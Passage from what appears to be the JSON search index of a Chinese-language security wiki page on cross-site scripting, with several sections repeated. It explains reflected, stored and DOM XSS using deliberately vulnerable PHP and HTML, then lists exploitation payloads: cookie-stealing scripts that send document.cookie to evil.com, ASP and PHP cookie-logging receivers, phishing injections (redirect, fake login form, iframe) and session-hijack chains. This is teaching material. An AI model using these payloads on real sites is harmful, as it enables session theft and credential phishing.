URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002 HTML \u4ee3\u7801\uff1a < html > < head > < title > DOM-XSS test </ title > </ head > < body > < script > var a = document . URL ; document . write ( a . substring ( a . indexOf ( \"a=\" ) + 2 , a . length )); </ script > </ body > </ html > \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script> \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002 XSS \u5229\u7528\u65b9\u5f0f \u00b6 Cookies \u7a83\u53d6 \u00b6 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a < script > document . location = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie new Image (). src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie </ script > < img src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie ></ img > \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a <% msg=Request.ServerVariables(\"QUERY_STRING\") testfile=Server.MapPath(\"cookie.txt\") set fs=server.CreateObject(\"Scripting.filesystemobject\") set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\"\"&msg& \"\") thisfile.close set fs=nothing %> <?php $cookie = $_GET [ 'cookie' ]; $log = fopen ( \"cookie.txt\" , \"a\" ); fwrite ( $log , $cookie . \" \\n \" ); fclose ( $log ); ?> \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002 \u4f1a\u8bdd\u52ab\u6301 \u00b6 \u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002 \u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002 \u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002 \u9493\u9c7c \u00b6 \u91cd\u5b9a\u5411\u9493\u9c7c \u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002 http://www.bug.com/index.php?search=\"'><script>document.location.href=\"http://www.evil.com\"</script> HTML \u6ce8\u5165\u5f0f\u9493\u9c7c \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002 http://www.bug.com/index.php?search=\"'<html><head><title>login</title></head><body><div style=\"text-align:center;\"><form Method=\"POST\" Action=\"phishing.php\" Name=\"form\"><br /><br />Login:<br/><input name=\"login\" /><br />Password:<br/><input name=\"Password\" type=\"password\" /><br/><br/><input name=\"Valid\" value=\"Ok\" type=\"submit\" /><br/></form></div></body></html> \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002 iframe \u9493\u9c7c \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7 <iframe> \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002 http://www.bug.com/index.php?search='><iframe src=\"http://www.evil.com\" height=\"100%\" width=\"100%\"</iframe> Flash \u9493\u9c7c \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528 <object> \u6216 <embed> \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002 \u9ad8\u7ea7\u9493\u9c7c\u6280\u672f \u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 \u7f51\u9875\u6302\u9a6c \u00b6 \u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528 <iframe> \u6807\u7b7e\u3002 DOS \u4e0e DDOS \u00b6 \u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 XSS \u8815\u866b \u00b6 \u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002 Self-XSS \u53d8\u5e9f\u4e3a\u5b9d\u7684\u573a\u666f \u00b6 Self-XSS \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709 XSS \u6f0f\u6d1e\u7684\u70b9\u53ea\u80fd\u7531\u653b\u51fb\u8005\u672c\u8eab\u89e6\u53d1\uff0c\u5373\u81ea\u5df1\u6253\u81ea\u5df1\u7684\u653b\u51fb\u3002\u6bd4\u5982\u4e2a\u4eba\u9690\u79c1\u7684\u8f93\u5165\u70b9\u5b58\u5728 XSS\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u9690\u79c1\u4fe1\u606f\u53ea\u80fd\u7531\u7528\u6237\u672c\u4eba\u67e5\u770b\u4e5f\u5c31\u65e0\u6cd5\u7528\u4e8e\u653b\u51fb\u5176\u4ed6\u4eba\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u901a\u5e38\u5371\u5bb3\u5f88\u5c0f\uff0c\u663e\u5f97\u6709\u4e9b\u9e21\u808b\u3002\u4f46\u662f\u5728\u4e00\u4e9b\u5177\u4f53\u7684\u573a\u666f\u4e0b\uff0c\u7ed3\u5408\u5176\u4ed6\u6f0f\u6d1e\uff08\u6bd4\u5982 CSRF \uff09\u5c31\u80fd\u5c06 Self-XSS \u8f6c\u53d8\u4e3a\u5177\u6709\u5371\u5bb3\u7684\u6f0f\u6d1e\u3002\u4e0b\u9762\u5c06\u603b\u7ed3\u4e00\u4e9b\u5e38\u89c1\u53ef\u5229\u7528 Self-XSS \u7684\u573a\u666f\u3002 \u767b\u5f55\u767b\u51fa\u5b58\u5728 CSRF\uff0c\u4e2a\u4eba\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0c\u7b2c\u4e09\u65b9\u767b\u5f55 \u8fd9\u79cd\u573a\u666f\u4e00\u822c\u7684\u5229\u7528\u6d41\u7a0b\u662f\u9996\u5148\u653b\u51fb\u8005\u5728\u4e2a\u4eba\u4fe1\u606f XSS \u70b9\u6ce8\u5165 Payload\uff0c\u7136\u540e\u653b\u51fb\u8005\u5236\u9020\u4e00\u4e2a\u6076\u610f\u9875\u9762\u8bf1\u5bfc\u53d7\u5bb3\u8005\u8bbf\u95ee\uff0c\u6076\u610f\u9875\u9762\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u6076\u610f\u9875\u9762\u6267\u884c\u5229\u7528 CSRF \u8ba9\u53d7\u5bb3\u8005\u767b\u5f55\u653b\u51fb\u8005\u7684\u4e2a\u4eba\u4fe1\u606f\u4f4d\u7f6e\uff0c\u89e6\u53d1 XSS payload JavaScript Payload \u751f\u6210 <iframe> \u6807\u7b7e\uff0c\u5e76\u5728\u6846\u67b6\u5185\u6267\u884c\u4ee5\u4e0b\u8fd9\u4e9b\u64cd\u4f5c \u8ba9\u53d7\u5bb3\u8005\u767b\u51fa\u653b\u51fb\u8005\u7684\u8d26\u53f7 \u7136\u540e\u4f7f\u5f97\u53d7\u5bb3\u8005\u901a\u8fc7 CSRF \u767b\u5f55\u5230\u81ea\u5df1\u7684\u8d26\u6237\u4e2a\u4eba\u4fe1\u606f\u754c\u9762 \u653b\u51fb\u8005\u4ece\u9875\u9762\u63d0\u53d6 CSRF Token \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 CSRF Token \u63d0\u4ea4\u4fee\u6539\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f \u8fd9\u79cd\u653b\u51fb\u6d41\u7a0b\u9700\u8981\u6ce8\u610f\u51e0\u4e2a\u5730\u65b9\uff1a\u7b2c\u4e09\u6b65\u767b\u5f55\u662f\u4e0d\u9700\u8981\u7528\u6237\u4ea4\u4e92\u7684\uff0c\u5229\u7528 Google Sign In \u7b49\u975e\u5bc6\u7801\u767b\u5f55\u65b9\u5f0f\u767b\u5f55\uff1b X-Frame-Options \u9700\u8981\u88ab\u8bbe\u7f6e\u4e3a\u540c\u6e90\uff08\u8be5\u9875\u9762\u53ef\u4ee5\u5728\u76f8\u540c\u57df\u540d\u9875\u9762\u7684 iframe \u4e2d\u5c55\u793a \uff09 \u767b\u5f55\u5b58\u5728 CSRF\uff0c\u8d26\u6237\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0cOAUTH \u8ba4\u8bc1 \u8ba9\u7528\u6237\u9000\u51fa\u8d26\u6237\u9875\u9762\uff0c\u4f46\u662f\u4e0d\u9000\u51fa OAUTH \u7684\u6388\u6743\u9875\u9762\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7528\u6237\u80fd\u91cd\u65b0\u767b\u5f55\u5176\u8d26\u6237\u9875\u9762 \u8ba9\u7528\u6237\u767b\u5f55\u6211\u4eec\u7684\u8d26\u6237\u9875\u9762\u51fa\u73b0 XSS\uff0c\u5229\u7528 \u4f7f\u7528 <iframe> \u6807\u7b7e\u7b49\u6267\u884c\u6076\u610f\u4ee3\u7801 \u767b\u5f55\u56de\u4ed6\u4eec\u5404\u81ea\u7684\u8d26\u6237\uff0c\u4f46\u662f\u6211\u4eec\u7684 XSS \u5df2\u7ecf\u7a83\u53d6\u5230 Session","title":"XSS"},{"location":"web/xss/#xss","text":"","title":"XSS"},{"location":"web/xss/#xss_1","text":"\u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002","title":"XSS \u7b80\u4ecb"},{"location":"web/xss/#xss_2","text":"\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?> \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86 name \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002","title":"\u53cd\u5c04\u578b XSS"},{"location":"web/xss/#xss_3","text":"\u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002 \u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = mysql_real_escape_string ( $message ); // Sanitize name input $name = mysql_real_escape_string ( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysql_query ( $query ) or die ( '<pre>' . mysql_error () . '</pre>' ); //mysql_close(); } ?> \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002","title":"\u6301\u4e45\u578b XSS"},{"location":"web/xss/#dom-xss","text":"\u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002 HTML \u4ee3\u7801\uff1a < html > < head > < title > DOM-XSS test </ title > </ head > < body > < script > var a = document . URL ; document . write ( a . substring ( a . indexOf ( \"a=\" ) + 2 , a . length )); </ script > </ body > </ html > \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script> \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002","title":"DOM XSS"},{"location":"web/xss/#xss_4","text":"","title":"XSS \u5229\u7528\u65b9\u5f0f"},{"location":"web/xss/#cookies","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a < script > document . location = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie new Image (). src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie </ script > < img src = \"http://www.evil.com/cookie.asp?cookie=\" + document . cookie ></ img > \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a <% msg=Request.ServerVariables(\"QUERY_STRING\") testfile=Server.MapPath(\"cookie.txt\") set fs=server.CreateObject(\"Scripting.filesystemobject\") set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\"\"&msg& \"\") thisfile.close set fs=nothing %> <?php $cookie = $_GET [ 'cookie' ]; $log = fopen ( \"cookie.txt\" , \"a\" ); fwrite ( $log , $cookie . \" \\n \" ); fclose ( $log ); ?> \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002","title":"Cookies \u7a83\u53d6"},{"location":"web/xss/#_1","text":"\u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002 \u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002 \u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002","title":"\u4f1a\u8bdd\u52ab\u6301"},{"location":"web/xss/#_2","text":"\u91cd\u5b9a\u5411\u9493\u9c7c \u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002 http://www.bug.com/index.php?search=\"'><script>document.location.href=\"http://www.evil.com\"</script> HTML 